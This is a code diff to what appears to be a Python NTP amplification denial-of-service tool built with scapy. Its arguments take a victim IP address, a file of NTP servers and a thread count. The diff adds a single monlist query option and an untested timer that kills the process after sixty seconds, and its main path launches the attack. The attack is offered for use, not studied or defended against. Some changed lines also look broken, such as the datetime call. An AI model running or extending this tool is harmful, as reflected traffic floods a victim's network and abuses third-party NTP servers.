@@ -1,3 +1,7 @@
+import os
+import time
+import threading
+import subprocess
 import argparse
 import logging
 import random
@@ -5,6 +9,8 @@ import threading
 import datetime
 
 from scapy.all import*
+
+kill_thread = None
 
 class NTPAmp(object):
     def __init__(self, fpath, victim, nthreads, sport, dport, warmup):
@@ -69,7 +75,7 @@ class NTPAmp(object):
             'dispersion': 1.0,
             #'ref_id': '',
             'orig': 0.0,
-            'sent': datetime.datetime.now().strftime("%a %b %d %H:%M:%S %Y")
+            'sent': datetime.now().strftime("%a %b %d %H:%M:%S %Y")
         }
         for ip, dport in self.ntpservs:
             self.logger.info("  [*] Add entry to ntpserver {}:{}".format(ip, dport))
@@ -123,6 +129,7 @@ class NTPAmp(object):
 def argument_parse():
     parser = argparse.ArgumentParser()
     parser.add_argument('-w', '--warmup', action='store_true', help='Execute warmup')
+    parser.add_argument('-s', '--single', action='store_true', help='Execute single get_monlist')
     parser.add_argument('-v', '--victim',  type=str, help='Victim IP Address')
     parser.add_argument('-n', '--nthreads',type=int, help='Number of threads (default 1)', default=1)
     parser.add_argument('-f', '--fpath', type=str, help='NTP Servers entry file path (default ./ntpservs.txt)', default='./ntpservs.txt')
@@ -131,10 +138,26 @@ def argument_parse():
     args = parser.parse_args()
     return args
 
+def spawn_kill_me():
+    """
+    not test yet
+    :return:
+    """
+    global kill_thread
+    def kill_me():
+        time.sleep(60)
+        pid = os.getpid()
+        subprocess.check_output(["kill", "-s", "SIGKILL", str(pid)], shell=True)
+    kill_thread = threading.Thread(target=kill_me)
+    kill_thread.start()
+
 if __name__ == '__main__':
     args = argument_parse()
     ntpamp = NTPAmp(args.fpath, args.victim, args.nthreads, args.sport, args.dport, args.warmup)
-    if args.warmup:
+    spawn_kill_me()
+    if args.single:
+        ntpamp.get_monlist()
+    elif args.warmup:
         ntpamp.warmup()
     else:
         ntpamp.attack()
